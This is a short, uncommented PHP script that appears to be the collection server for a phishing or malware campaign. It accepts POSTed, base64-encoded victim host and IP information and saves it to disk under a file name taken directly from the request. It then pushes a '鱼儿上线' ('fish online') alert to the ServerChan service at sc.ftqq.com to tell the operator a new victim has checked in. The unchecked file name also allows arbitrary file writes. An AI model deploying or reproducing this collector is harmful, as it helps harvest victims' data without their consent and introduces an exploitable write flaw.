<?php
error_reporting(0);

$time = $_POST['time'];
$ip = $_POST['ip'];
$info = $_POST['info'];
$ipinfo = $_POST['ipinfo'];

$info = str_replace(' ','+',$info);
$ipinfo = str_replace(' ','+',$ipinfo);

if ($ip == '') {
		$ip = date('Y-m-d_H:i:s');
}

file_put_contents($ip.".txt",$time."\n================================================================================================\n".base64_decode($info)."\n================================================================================================\n".base64_decode($ipinfo));



function sc_send($text , $desp = '' , $key = ''  )
{
	$postdata = http_build_query(
    array(
        'text' => $text,
        'desp' => $desp
    )
);

$opts = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-type: application/x-www-form-urlencoded',
        'content' => $postdata
    )
);
$context  = stream_context_create($opts);
return $result = file_get_contents('https://sc.ftqq.com/'.$key.'.send', false, $context);

}

sc_send("鱼儿上线 - ".$ip);
echo "ok";


